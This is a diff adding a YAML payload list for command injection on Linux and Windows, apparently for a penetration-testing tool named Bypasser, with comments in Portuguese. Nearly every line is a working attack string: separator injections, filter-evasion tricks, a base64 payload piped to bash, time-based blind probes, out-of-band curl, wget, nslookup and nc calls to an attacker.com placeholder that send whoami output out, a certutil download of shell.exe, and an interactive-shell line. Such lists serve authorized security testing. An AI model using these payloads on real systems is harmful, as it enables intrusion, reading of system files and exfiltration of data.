@@ -1,0 +1,100 @@
+# Bypasser - payloads Command Injection (Linux/Windows, blind e out-of-band)
+# Troque COLLAB.attacker.com pelo dominio do seu colaborador (Burp Collaborator / interactsh).
+payloads:
+  # --- separadores basicos ---
+  - ";id"
+  - "|id"
+  - "||id"
+  - "&id"
+  - "&&id"
+  - "`id`"
+  - "$(id)"
+  - "$(whoami)"
+  - "%0aid"
+  - "';id;'"
+  - "';ls;'"
+  - "|whoami"
+  - ";whoami"
+  - "&whoami"
+  - "&&whoami"
+  - "`whoami`"
+  - "$(whoami)"
+  - "; cat /etc/passwd"
+  - "&& cat /etc/passwd"
+  - "| cat /etc/hostname"
+  - ";echo PWNED"
+  - "|echo PWNED"
+  - "&echo PWNED"
+
+  # --- bypass de espaco (IFS) ---
+  - "${IFS}id"
+  - "$IFS$9id"
+  - "cat${IFS}/etc/passwd"
+  - "cat$IFS$9/etc/passwd"
+  - "{cat,/etc/passwd}"
+  - "{ls,-la}"
+  - "cat%09/etc/passwd"
+  - "sh${IFS}-c${IFS}'id'"
+
+  # --- bypass de palavras-chave (ofuscacao) ---
+  - "c''at${IFS}/etc/passwd"
+  - "c\\at${IFS}/etc/passwd"
+  - "c'a't${IFS}/etc/passwd"
+  - "ca$*t${IFS}/etc/passwd"
+  - "c$@at${IFS}/etc/passwd"
+  - "echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|bash"
+  - "$(echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|bash)"
+  - "cat${IFS}/etc/pa''sswd"
+  - "cat${IFS}/etc/pass${x}wd"
+
+  # --- blind time-based ---
+  - ";sleep 5"
+  - "|sleep 5"
+  - "&&sleep 5"
+  - "`sleep 5`"
+  - "$(sleep 5)"
+  - ";sleep${IFS}5"
+  - ";ping${IFS}-c${IFS}5${IFS}127.0.0.1"
+  - "|ping -n 5 127.0.0.1"          # Windows
+  - "&ping -n 5 127.0.0.1"          # Windows
+  - ";timeout${IFS}5"
+
+  # --- out-of-band / exfiltracao DNS e HTTP ---
+  - "|nslookup$(echo${IFS}COLLAB).attacker.com"
+  - ";nslookup$(echo${IFS}COLLAB).attacker.com"
+  - "`nslookup COLLAB.attacker.com`"
+  - "$(nslookup$(echo${IFS}COLLAB).attacker.com)"
+  - "|curl${IFS}http://COLLAB.attacker.com/"
+  - ";curl${IFS}http://COLLAB.attacker.com/$(whoami)"
+  - "|wget${IFS}http://COLLAB.attacker.com/$(whoami)"
+  - "||dig${IFS}COLLAB.attacker.com"
+  - "|nc${IFS}COLLAB.attacker.com${IFS}4444"
+
+  # --- Windows ---
+  - "&whoami"
+  - "|whoami"
+  - "&dir"
+  - "&type C:\\windows\\win.ini"
+  - "&powershell -c whoami"
+  - "|powershell.exe -nop -w hidden -c whoami"
+  - "&powershell -enc dwBoAG8AYQBtAGkA"
+  - "&cmd /c whoami"
+  - "|cmd /c whoami"
+  - "&certutil -urlcache -split -f http://attacker.com/shell.exe C:\\temp\\s.exe"
+  - "&for /f %a in ('whoami') do @echo %a"
+
+  # --- novas linhas / CRLF (literal \n e \r\n) ---
+  - '%0acat${IFS}/etc/passwd'
+  - '%0d%0acat${IFS}/etc/passwd'
+  - '\nid'
+  - '\r\nid'
+  - "id%0a"
+
+  # --- variaveis e execucao indireta ---
+  - "$({IFS}id)"
+  - "$({IFS}cat${IFS}/etc/passwd)"
+  - "$(cat${IFS}/etc/passwd)"
+  - "`cat${IFS}/etc/passwd`"
+  - ";echo${IFS}$(whoami)"
+  - "'; system('id');#"
+  - "|sh${IFS}-i"
